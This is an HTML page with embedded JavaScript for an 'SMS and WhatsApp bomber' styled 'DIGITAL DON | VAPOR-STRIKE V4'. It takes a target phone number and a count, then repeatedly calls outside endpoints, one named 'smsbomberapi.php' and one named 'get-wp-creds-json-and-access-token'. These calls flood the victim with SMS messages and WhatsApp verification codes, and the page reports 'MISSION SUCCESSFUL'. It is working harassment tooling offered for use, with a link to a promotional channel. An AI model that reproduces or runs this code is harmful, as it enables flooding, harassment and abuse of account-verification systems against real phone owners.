<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIGITAL DON | VAPOR-STRIKE V4</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Teko:wght@300;500;700&display=swap');

        :root {
            --neon-cyan: #00f2fe;
            --neon-purple: #7000ff;
            --bg-dark: #08080c;
            --glass-bg: rgba(20, 20, 30, 0.8);
        }

        body {
            background-color: var(--bg-dark);
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(112, 0, 255, 0.2) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(0, 242, 254, 0.2) 0%, transparent 50%);
            color: #fff;
            font-family: 'Teko', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            letter-spacing: 1px;
        }

        .cyber-box {
            position: relative;
            width: 90%;
            max-width: 450px;
            padding: 40px;
            background: var(--glass-bg);
            border-radius: 20px;
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
            overflow: hidden;
            text-align: center;
        }

        /* Animated Top Border */
        .cyber-box::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 4px;
            background: linear-gradient(90deg, transparent, var(--neon-cyan), var(--neon-purple), transparent);
            animation: border-flow 3s linear infinite;
        }

        @keyframes border-flow {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .header h1 {
            font-family: 'Syncopate', sans-serif;
            font-size: 26px;
            margin: 0;
            background: linear-gradient(to right, var(--neon-cyan), var(--neon-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 15px rgba(0, 242, 254, 0.6));
        }

        .dev-name {
            font-size: 18px;
            color: #ccc;
            text-transform: uppercase;
            margin-top: 8px;
            letter-spacing: 4px;
        }

        /* Input Controls */
        .input-group { margin-bottom: 15px; }
        
        input, select {
            width: 100%;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 242, 254, 0.3);
            padding: 12px;
            border-radius: 10px;
            color: #fff;
            font-size: 20px;
            font-family: 'Teko', sans-serif;
            outline: none;
            transition: 0.3s;
        }

        input:focus {
            border-color: var(--neon-cyan);
            box-shadow: 0 0 15px rgba(0, 242, 254, 0.3);
        }

        /* Action Buttons */
        .btn-strike {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, var(--neon-purple), var(--neon-cyan));
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 24px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 4px 20px rgba(112, 0, 255, 0.5);
            margin-top: 10px;
            transition: 0.3s;
        }

        .btn-strike:hover {
            transform: scale(1.02);
            filter: brightness(1.2);
            box-shadow: 0 0 25px var(--neon-cyan);
        }

        /* WhatsApp Button */
        .btn-whatsapp {
            display: inline-block;
            width: 100%;
            margin-top: 15px;
            padding: 12px;
            background: transparent;
            border: 2px solid #25D366;
            color: #25D366;
            border-radius: 10px;
            text-decoration: none;
            font-size: 20px;
            font-weight: bold;
            transition: 0.3s;
            box-sizing: border-box;
        }

        .btn-whatsapp:hover {
            background: #25D366;
            color: #000;
            box-shadow: 0 0 20px rgba(37, 211, 102, 0.5);
        }

        /* Progress Area */
        .logger { margin-top: 20px; }
        
        #status-text {
            font-size: 18px;
            color: var(--neon-cyan);
            height: 25px;
            font-family: monospace;
        }

        .progress-track {
            height: 8px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            margin-top: 10px;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        #progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple));
            box-shadow: 0 0 15px var(--neon-cyan);
            transition: 0.3s;
        }
    </style>
</head>
<body>

<div class="cyber-box">
    <div class="header">
        <h1>DIGITAL DON</h1>
        <div class="dev-name">NIZAMANI</div>
    </div>

    <div style="margin: 25px 0;">
        <div class="input-group">
            <input type="text" id="target" placeholder="TARGET NUMBER (92...)">
        </div>

        <div class="input-group">
            <input type="number" id="packets" placeholder="PACKET COUNT (1-100)">
        </div>

        <div class="input-group">
            <select id="mode">
                <option value="sms">SMS BURST MODE</option>
                <option value="wp">WHATSAPP OVERLOAD</option>
                <option value="multi">HYBRID INJECTION</option>
            </select>
        </div>

        <button onclick="runStriker()" id="strike-btn" class="btn-strike">INITIALIZE STRIKE</button>
        
        <a href="https://whatsapp.com/channel/0029VbAfR3Z4CrfrBQe5EX43" target="_blank" class="btn-whatsapp">
            JOIN WHATSAPP CHANNEL
        </a>
    </div>

    <div class="logger">
        <div id="status-text"></div>
        <div class="progress-track">
            <div id="progress-fill"></div>
        </div>
    </div>
</div>

<script>
    async function fire(type, num) {
        const url = type === 'sms' 
            ? `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${num}`
            : `https://get-wp-creds-json-and-access-token.onrender.com/code?number=${num}`;
        try { await fetch(url, { mode: 'no-cors' }); } catch(e) {}
    }

    async function runStriker() {
        const target = document.getElementById('target').value;
        const count = parseInt(document.getElementById('packets').value) || 10;
        const mode = document.getElementById('mode').value;
        const btn = document.getElementById('strike-btn');
        const fill = document.getElementById('progress-fill');
        const status = document.getElementById('status-text');

        if(!target || target.length < 10) {
            status.innerHTML = "<span style='color:red'>INVALID TARGET!</span>";
            return;
        }

        btn.disabled = true;
        btn.style.opacity = "0.6";
        
        for(let i=1; i<=count; i++) {
            status.innerHTML = `INJECTING: ${i}/${count}`;
            
            if(mode === 'multi') {
                await Promise.all([fire('sms', target), fire('wp', target)]);
            } else {
                await fire(mode, target);
            }

            fill.style.width = (i/count)*100 + "%";
            await new Promise(r => setTimeout(r, 100));
        }

        status.innerHTML = "<span style='color:#00ff00'>MISSION SUCCESSFUL</span>";
        btn.disabled = false;
        btn.style.opacity = "1";
        setTimeout(() => { status.innerHTML = ""; fill.style.width = "0%"; }, 5000);
    }
</script>

</body>
</html>
